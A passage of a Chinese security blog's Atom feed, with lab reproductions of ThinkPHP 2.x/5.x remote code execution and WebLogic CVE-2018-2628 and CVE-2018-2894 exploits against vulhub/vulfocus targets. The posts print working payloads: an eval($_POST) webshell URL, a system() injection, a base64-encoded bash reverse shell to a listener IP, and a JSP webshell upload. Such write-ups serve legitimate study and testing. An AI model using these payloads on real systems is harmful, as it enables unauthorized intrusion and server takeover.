-    <content type="html"><![CDATA[<h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p>ThinkPHP 2.x版本中，使用 <strong>preg_replace</strong> 的 <strong>/e</strong> 模式匹配路由：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$res &#x3D; preg_replace(&#39;@(\w+)&#39;.$depr.&#39;([^&#39;.$depr.&#39;\&#x2F;]+)@e&#39;, &#39;$var[\&#39;\\1\&#39;]&#x3D;&quot;\\2&quot;;&#39;, implode($depr,$paths));</span><br></pre></td></tr></table></figure><p>导致用户的输入参数被插入双引号中执行，造成任意代码执行漏洞。</p><p>ThinkPHP 3.0版本因为Lite模式下没有修复该漏洞，也存在这个漏洞。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>使用vulfocous启动漏洞环境</p><p><img src="https://qiniu.hzktester.top/tp2020092801.png" alt="image"></p><p>打开就是ThinkPHP的默认页面</p><p><img src="https://qiniu.hzktester.top/tp2020092802.png" alt="image"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>直接访问 <strong><a href="http://your-ip:8080/index.php?s=/index/index/name/$%7B@phpinfo()%7D">http://your-ip:8080/index.php?s=/index/index/name/$%7B@phpinfo()%7D</a></strong> 即可执行<strong>phpinfo()</strong>:</p><p><img src="https://qiniu.hzktester.top/tp2020092803.png" alt="image"></p><p>然后接入一句话</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;index.php?s&#x3D;&#x2F;index&#x2F;index&#x2F;xxx&#x2F;$&#123;$&#123;@eval($_POST[1])&#125;&#125;</span><br></pre></td></tr></table></figure><p>使用蚁剑连接</p><p><img src="https://qiniu.hzktester.top/tp2020092804.png" alt="image"></p><p>拿到flag</p><p><img src="https://qiniu.hzktester.top/tp2020092805.png" alt="image"></p>]]></content>
-    
-    
-    <summary type="html">&lt;h2 id=&quot;漏洞详情&quot;&gt;&lt;a href=&quot;#漏洞详情&quot; class=&quot;headerlink&quot; title=&quot;漏洞详情&quot;&gt;&lt;/a&gt;漏洞详情&lt;/h2&gt;&lt;p&gt;ThinkPHP 2.x版本中，使用 &lt;strong&gt;preg_replace&lt;/strong&gt; 的 &lt;strong&gt;/e&lt;/strong&gt; 模式匹配路由：&lt;/p&gt;
-&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$res &amp;#x3D; preg_replace(&amp;#39;@(\w+)&amp;#39;.$depr.&amp;#39;([^&amp;#39;.$depr.&amp;#39;\&amp;#x2F;]+)@e&amp;#39;, &amp;#39;$var[\&amp;#39;\\1\&amp;#39;]&amp;#x3D;&amp;quot;\\2&amp;quot;;&amp;#39;, implode($depr,$paths));&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;p&gt;导致用户的输入参数被插入双引号中执行，造成任意代码执行漏洞。&lt;/p&gt;
-&lt;p&gt;ThinkPHP 3.0版本因为Lite模式下没有修复该漏洞，也存在这个漏洞。&lt;/p&gt;
-&lt;h2 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h2&gt;&lt;p&gt;使用vulfocous启动漏洞环境&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://qiniu.hzktester.top/tp2020092801.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
-&lt;p&gt;打开就是ThinkPHP的默认页面&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://qiniu.hzktester.top/tp2020092802.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="漏洞复现" scheme="https://hzktester.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
-    
-    
-    <category term="ThinkPHP" scheme="https://hzktester.top/tags/ThinkPHP/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>ThinkPHP 5.x 远程代码执行漏洞复现（CNVD-2018-24942）</title>
-    <link href="https://hzktester.top/2020/09/28/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ThinkPHP%205.x%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CNVD-2018-24942%EF%BC%89/"/>
-    <id>https://hzktester.top/2020/09/28/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ThinkPHP%205.x%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CNVD-2018-24942%EF%BC%89/</id>
-    <published>2020-09-28T01:27:00.000Z</published>
-    <updated>2020-10-19T13:02:16.644Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>ThinkPHP5 存在远程代码执行漏洞。该漏洞由于框架对控制器名未能进行足够的检测，攻击者利用该漏洞对目标网站进行远程命令执行攻击。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>上海顶想信息科技有限公司 ThinkPHP 5.*，&lt;5.1.31</p><p>上海顶想信息科技有限公司 ThinkPHP &lt;=5.0.23</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>使用 vulfocus 启动漏洞环境</p><p><img src="https://qiniu.hzktester.top/tp2020092806.png" alt="image"></p><p>访问页面如下：</p><p><img src="https://qiniu.hzktester.top/tp2020092807.png" alt="image"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;index.php&#x2F;?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;ls%20&#x2F;tmp</span><br></pre></td></tr></table></figure><p>直接访问拿到flag</p><p><img src="https://qiniu.hzktester.top/tp2020092808.png" alt="image"></p>]]></content>
-    
-    
-    <summary type="html">&lt;h2 id=&quot;漏洞描述&quot;&gt;&lt;a href=&quot;#漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;漏洞描述&quot;&gt;&lt;/a&gt;漏洞描述&lt;/h2&gt;&lt;p&gt;ThinkPHP5 存在远程代码执行漏洞。该漏洞由于框架对控制器名未能进行足够的检测，攻击者利用该漏洞对目标网站进行远程命令执行攻击。&lt;/p&gt;
-&lt;h2 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h2&gt;&lt;p&gt;上海顶想信息科技有限公司 ThinkPHP 5.*，&amp;lt;5.1.31&lt;/p&gt;
-&lt;p&gt;上海顶想信息科技有限公司 ThinkPHP &amp;lt;=5.0.23&lt;/p&gt;
-&lt;h2 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h2&gt;&lt;p&gt;使用 vulfocus 启动漏洞环境&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://qiniu.hzktester.top/tp2020092806.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
-&lt;p&gt;访问页面如下：&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://qiniu.hzktester.top/tp2020092807.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="漏洞复现" scheme="https://hzktester.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
-    
-    
-    <category term="ThinkPHP" scheme="https://hzktester.top/tags/ThinkPHP/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>WebLogic T3协议反序列化漏洞复现（CVE-2018-2628）</title>
-    <link href="https://hzktester.top/2020/09/27/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/WebLogic%20T3%E5%8D%8F%E8%AE%AE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2018-2628%EF%BC%89/"/>
-    <id>https://hzktester.top/2020/09/27/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/WebLogic%20T3%E5%8D%8F%E8%AE%AE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2018-2628%EF%BC%89/</id>
-    <published>2020-09-27T08:19:00.000Z</published>
-    <updated>2020-10-19T13:02:25.893Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p>开放Weblogic控制台的7001端口，默认会开启T3协议服务，T3协议触发的Weblogic Server WLS Core Components中存在反序列化漏洞，攻击者可以发送构造的恶意T3协议数据，获取目标服务器权限。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Weblogic 10.3.6.0<br>Weblogic 12.1.3.0<br>Weblogic 12.2.1.2<br>Weblogic 12.2.1.3</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="靶机环境"><a href="#靶机环境" class="headerlink" title="靶机环境"></a>靶机环境</h3><p>使用vulhub搭建漏洞环境</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd vulhub&#x2F;weblogic&#x2F;CVE-2018-2628</span><br><span class="line"></span><br><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020092711.png" alt="image"></p><p>访问 <a href="http://47.101.62.20:7001/console">http://47.101.62.20:7001/console</a> 初始化整个环境</p><h3 id="攻击机环境"><a href="#攻击机环境" class="headerlink" title="攻击机环境"></a>攻击机环境</h3><p>下载 <strong>ysoserial-0.0.6-SNAPSHOT-BETA-all.jar</strong>利用包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;github.com&#x2F;brianwrf&#x2F;ysoserial&#x2F;releases&#x2F;download&#x2F;0.0.6-pri-beta&#x2F;ysoserial-0.0.6-SNAPSHOT-BETA-all.jar</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020092712.png" alt="image"></p><p>下载漏洞利用EXP，我这里已经下载好了</p><p><a href="https://www.exploit-db.com/exploits/44553">https://www.exploit-db.com/exploits/44553</a></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>监听端口19110</p><p><img src="https://qiniu.hzktester.top/tp2020092713.png" alt="image"></p><p>使用<strong>ysoserial</strong>启动一个<strong>JMRP Server</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 19111 CommonsCollections1 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDEuNjIuMjAvMTkxMTAgMD4mMQ&#x3D;&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></pre></td></tr></table></figure><blockquote><p>JMRP Server在19111端口上监听请求，向目标服务器发送序列化的bash反弹shell命令，反弹监听的端口为19110</p></blockquote><p><img src="https://qiniu.hzktester.top/tp2020092714.png" alt="image"></p><p>使用CVE-2018-2628的EXP向目标WebLogic服务器发送攻击载荷</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python CVE-2018-2628.py 47.101.62.20 7001 ..&#x2F;ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 47.101.62.20 19111 JRMPClient</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020092715.png" alt="image"></p><p>成功反弹shell</p><p><img src="https://qiniu.hzktester.top/tp2020092716.png" alt="image"></p>]]></content>
-    
-    
-    <summary type="html">&lt;h2 id=&quot;漏洞详情&quot;&gt;&lt;a href=&quot;#漏洞详情&quot; class=&quot;headerlink&quot; title=&quot;漏洞详情&quot;&gt;&lt;/a&gt;漏洞详情&lt;/h2&gt;&lt;p&gt;开放Weblogic控制台的7001端口，默认会开启T3协议服务，T3协议触发的Weblogic Server WLS Core Components中存在反序列化漏洞，攻击者可以发送构造的恶意T3协议数据，获取目标服务器权限。&lt;/p&gt;
-&lt;h2 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h2&gt;&lt;p&gt;Weblogic 10.3.6.0&lt;br&gt;Weblogic 12.1.3.0&lt;br&gt;Weblogic 12.2.1.2&lt;br&gt;Weblogic 12.2.1.3&lt;/p&gt;
-&lt;h2 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h2&gt;&lt;h3 id=&quot;靶机环境&quot;&gt;&lt;a href=&quot;#靶机环境&quot; class=&quot;headerlink&quot; title=&quot;靶机环境&quot;&gt;&lt;/a&gt;靶机环境&lt;/h3&gt;&lt;p&gt;使用vulhub搭建漏洞环境&lt;/p&gt;
-&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;cd vulhub&amp;#x2F;weblogic&amp;#x2F;CVE-2018-2628&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;docker-compose build&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;docker-compose up -d&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;p&gt;&lt;img src=&quot;https://qiniu.hzktester.top/tp2020092711.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
-&lt;p&gt;访问 &lt;a href=&quot;http://47.101.62.20:7001/console&quot;&gt;http://47.101.62.20:7001/console&lt;/a&gt; 初始化整个环境&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="漏洞复现" scheme="https://hzktester.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
-    
-    
-    <category term="WebLogic" scheme="https://hzktester.top/tags/WebLogic/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>WebLogic任意文件上传漏洞复现（CVE-2018-2894）</title>
-    <link href="https://hzktester.top/2020/09/27/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/WebLogic%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2018-2894%EF%BC%89/"/>
-    <id>https://hzktester.top/2020/09/27/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/WebLogic%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2018-2894%EF%BC%89/</id>
-    <published>2020-09-27T06:38:00.000Z</published>
-    <updated>2020-10-19T13:02:32.811Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Oracle官方发布了7月份的关键补丁更新CPU（Critical Patch Update）,其中包含一个高危的Weblogic未授权任意文件上传漏洞(CVE-2018-2894)</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Oracle WebLogic Server，版本<strong>10.3.6.0，12.1.3.0，12.2.1.2，12.2.1.3</strong>。 </p><p>该漏洞的影响模块为web服务测试页，在默认情况下不启用。 受影响的页面为 <strong>/ws_utc/config.do</strong> 和 <strong>/ws_utc/begin.do</strong></p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>使用vulhub搭建漏洞环境</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd vulhub&#x2F;weblogic&#x2F;CVE-2018-2894</span><br><span class="line"></span><br><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>直接访问存在漏洞的页面<strong><a href="http://47.101.62.20:7001/ws_utc/config.do">http://47.101.62.20:7001/ws_utc/config.do</a></strong><br><img src="https://qiniu.hzktester.top/tp2020092706.png" alt="image"></p><p>将目录设置为<strong>ws_utc</strong>应用的静态文件css目录，访问这个目录是无需权限的,可以直接进行访问上传的文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;u01&#x2F;oracle&#x2F;user_projects&#x2F;domains&#x2F;base_domain&#x2F;servers&#x2F;AdminServer&#x2F;tmp&#x2F;_WL_internal&#x2F;com.oracle.webservices.wls.ws-testclient-app-wls&#x2F;4mcj4y&#x2F;war&#x2F;css</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020092707.png" alt="image"></p><p>打开安全页面，然后上传<strong>webshell</strong>，并且获取时间戳<br><img src="https://qiniu.hzktester.top/tp2020092708.png" alt="image"><br><img src="https://qiniu.hzktester.top/tp2020092709.png" alt="image"></p><p>访问上传的jsp马</p><blockquote><p>具体格式为 <a href="http://your-ip:7001/ws_utc/css/config/keystore/[%E6%97%B6%E9%97%B4%E6%88%B3]_[%E6%96%87%E4%BB%B6%E5%90%8D]">http://your-ip:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]</a></p></blockquote><p><img src="https://qiniu.hzktester.top/tp2020092710.png" alt="image"></p>]]></content>
-    
-    
-    <summary type="html">&lt;h2 id=&quot;漏洞描述&quot;&gt;&lt;a href=&quot;#漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;漏洞描述&quot;&gt;&lt;/a&gt;漏洞描述&lt;/h2&gt;&lt;p&gt;Oracle官方发布了7月份的关键补丁更新CPU（Critical Patch Update）,其中包含一个高危的Weblogic未授权任意文件上传漏洞(CVE-2018-2894)&lt;/p&gt;
-&lt;h2 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h2&gt;&lt;p&gt;Oracle WebLogic Server，版本&lt;strong&gt;10.3.6.0，12.1.3.0，12.2.1.2，12.2.1.3&lt;/strong&gt;。 &lt;/p&gt;
-&lt;p&gt;该漏洞的影响模块为web服务测试页，在默认情况下不启用。 受影响的页面为 &lt;strong&gt;/ws_utc/config.do&lt;/strong&gt; 和 &lt;strong&gt;/ws_utc/begin.do&lt;/strong&gt;&lt;/p&gt;
-&lt;h2 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h2&gt;&lt;p&gt;使用vulhub搭建漏洞环境&lt;/p&gt;
-&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;cd vulhub&amp;#x2F;weblogic&amp;#x2F;CVE-2018-2894&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;docker-compose build&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;docker-compose up -d&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;p&gt;直接访问存在漏洞的页面&lt;strong&gt;&lt;a href=&quot;http://47.101.62.20:7001/ws_utc/config.do&quot;&gt;http://47.101.62.20:7001/ws_utc/config.do&lt;/a&gt;&lt;/strong&gt;&lt;br&gt;&lt;img src=&quot;https://qiniu.hzktester.top/tp2020092706.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
-&lt;p&gt;将目录设置为&lt;strong&gt;ws_utc&lt;/strong&gt;应用的静态文件css目录，访问这个目录是无需权限的,可以直接进行访问上传的文件&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="漏洞复现" scheme="https://hzktester.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
-    
-    
-    <category term="WebLogic" scheme="https://hzktester.top/tags/WebLogic/"/>
     
   </entry>
   
